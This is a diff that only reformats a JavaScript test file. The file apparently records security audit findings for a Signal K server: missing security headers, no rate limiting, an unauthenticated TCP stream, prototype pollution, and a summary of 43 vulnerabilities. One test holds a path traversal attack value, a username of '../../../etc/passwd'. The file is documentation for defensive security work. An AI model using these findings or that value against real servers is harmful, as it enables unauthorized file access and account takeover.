-      };
+      }
 
-      expect(vulnerability.code).to.include('JSON.stringify');
-    });
-  });
+      expect(vulnerability.code).to.include('JSON.stringify')
+    })
+  })
 
   // ==================== MISSING SECURITY HEADERS ====================
 
-  describe('Missing Security Headers', function() {
-
-    it('MEDIUM: No helmet or security headers middleware', function() {
+  describe('Missing Security Headers', function () {
+    it('MEDIUM: No helmet or security headers middleware', function () {
       /**
        * VERIFIED FINDING
        * Files: src/index.ts, src/serverroutes.ts
@@ -1232,17 +1219,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         ],
         recommendation: 'Use helmet middleware',
         impact: 'Clickjacking, XSS, MIME sniffing attacks possible'
-      };
+      }
 
-      expect(vulnerability.missingHeaders.length).to.be.above(5);
-    });
-  });
+      expect(vulnerability.missingHeaders.length).to.be.above(5)
+    })
+  })
 
   // ==================== NO RATE LIMITING ====================
 
-  describe('No Rate Limiting', function() {
-
-    it('HIGH: No rate limiting on login endpoint', function() {
+  describe('No Rate Limiting', function () {
+    it('HIGH: No rate limiting on login endpoint', function () {
       /**
        * VERIFIED FINDING
        * File: src/tokensecurity.js (login endpoint)
@@ -1261,12 +1247,12 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'Username enumeration'
         ],
         impact: 'Account takeover via brute force'
-      };
+      }
 
-      expect(vulnerability.rateLimited).to.be.false;
-    });
+      expect(vulnerability.rateLimited).to.be.false
+    })
 
-    it('HIGH: No rate limiting on API endpoints', function() {
+    it('HIGH: No rate limiting on API endpoints', function () {
       /**
        * VERIFIED FINDING
        * No rate limiting middleware in the entire application.
@@ -1276,23 +1262,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
       const vulnerability = {
         endpoints: ['All API endpoints'],
         rateLimited: false,
-        attacks: [
-          'API abuse',
-          'Resource exhaustion',
-          'Data scraping at scale'
-        ],
+        attacks: ['API abuse', 'Resource exhaustion', 'Data scraping at scale'],
         impact: 'Denial of service, resource exhaustion'
-      };
+      }
 
-      expect(vulnerability.rateLimited).to.be.false;
-    });
-  });
+      expect(vulnerability.rateLimited).to.be.false
+    })
+  })
 
   // ==================== TCP STREAM PORT BINDING ====================
 
-  describe('TCP Stream Interface Security', function() {
-
-    it('HIGH: Signal K TCP stream on port 8375 trusts network data', function() {
+  describe('TCP Stream Interface Security', function () {
+    it('HIGH: Signal K TCP stream on port 8375 trusts network data', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/tcp.ts lines 43-68
@@ -1320,17 +1301,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'Can subscribe to any path and receive data'
         ],
         impact: 'Unauthenticated data access/injection via TCP'
-      };
+      }
 
-      expect(vulnerability.port).to.equal(8375);
-    });
-  });
+      expect(vulnerability.port).to.equal(8375)
+    })
+  })
 
   // ==================== USER IDENTIFIER PATH TRAVERSAL ====================
 
-  describe('User Identifier Path Traversal', function() {
-
-    it('HIGH: Username used in file paths without sanitization', function() {
+  describe('User Identifier Path Traversal', function () {
+    it('HIGH: Username used in file paths without sanitization', function () {
       /**
        * VERIFIED VULNERABILITY
        * File: src/interfaces/applicationData.js lines 205, 235
@@ -1355,17 +1335,16 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         identifierSource: 'src/tokensecurity.js:429 (user.userId from request)',
         attack: 'Register with username: "../../../etc/passwd"',
         impact: 'Path traversal via malicious username'
-      };
+      }
 
-      expect(vulnerability.attack).to.include('../');
-    });
-  });
+      expect(vulnerability.attack).to.include('../')
+    })
+  })
 
   // ==================== USERNAME CASE SENSITIVITY ====================
 
-  describe('Username Case Sensitivity Issues', function() {
-
-    it('LOW: Case-sensitive username comparison', function() {
+  describe('Username Case Sensitivity Issues', function () {
+    it('LOW: Case-sensitive username comparison', function () {
       /**
        * VERIFIED FINDING
        * File: src/tokensecurity.js line 285
@@ -1385,18 +1364,18 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
         issue: 'Case-sensitive username comparison',
         examples: ['Admin vs admin vs ADMIN are different users'],
         recommendation: 'username.toLowerCase() === name.toLowerCase()'
-      };
+      }
 
-      expect(finding.code).to.not.include('toLowerCase');
-    });
-  });
+      expect(finding.code).to.not.include('toLowerCase')
+    })
+  })
 
   // ==================== SUMMARY ====================
 
-  describe('Additional Real Vulnerabilities Summary', function() {
-    it('should document all verified vulnerabilities', function() {
+  describe('Additional Real Vulnerabilities Summary', function () {
+    it('should document all verified vulnerabilities', function () {
       const verifiedVulns = {
-        'Critical': [
+        Critical: [
           'json-patch@0.7.0 prototype pollution (CVE)',
           'jsonpatch.apply with user input',
           '_.set() with URL path (__proto__)',
@@ -1410,7 +1389,7 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'ReDoS via WebSocket subscribe (subscriptionmanager.ts)',
           'Dynamic require() in pipedproviders.ts'
         ],
-        'High': [
+        High: [
           'Logfile path traversal bypass',
           'Provider ID no validation',
           'MMSI/UUID injection',
@@ -1428,7 +1407,7 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'No rate limiting on API (DoS)',
           'Username path traversal in applicationData'
         ],
-        'Medium': [
+        Medium: [
           'validateAppId allows dangerous chars',
           'semver.coerce too lenient',
           'Debug endpoint info disclosure',
@@ -1442,24 +1421,22 @@ describe('Additional Real Vulnerabilities - Code Verified', function() {
           'JWT payload leaked in error messages',
           'Missing security headers (no helmet)'
         ],
-        'Low': [
-          'Case-sensitive username comparison'
-        ]
-      };
+        Low: ['Case-sensitive username comparison']
+      }
 
-      const total = Object.values(verifiedVulns).flat().length;
+      const total = Object.values(verifiedVulns).flat().length
 
-      console.log('\n  ========================================');
-      console.log('  Additional Real Vulnerabilities');
-      console.log('  ========================================');
-      console.log(`  Critical: ${verifiedVulns.Critical.length}`);
-      console.log(`  High: ${verifiedVulns.High.length}`);
-      console.log(`  Medium: ${verifiedVulns.Medium.length}`);
-      console.log(`  Low: ${verifiedVulns.Low.length}`);
-      console.log(`  Total: ${total}`);
-      console.log('  ========================================\n');
+      console.log('\n  ========================================')
+      console.log('  Additional Real Vulnerabilities')
+      console.log('  ========================================')
+      console.log(`  Critical: ${verifiedVulns.Critical.length}`)
+      console.log(`  High: ${verifiedVulns.High.length}`)
+      console.log(`  Medium: ${verifiedVulns.Medium.length}`)
+      console.log(`  Low: ${verifiedVulns.Low.length}`)
+      console.log(`  Total: ${total}`)
+      console.log('  ========================================\n')
 
-      expect(total).to.equal(43);
-    });
-  });
-});
+      expect(total).to.equal(43)
+    })
+  })
+})
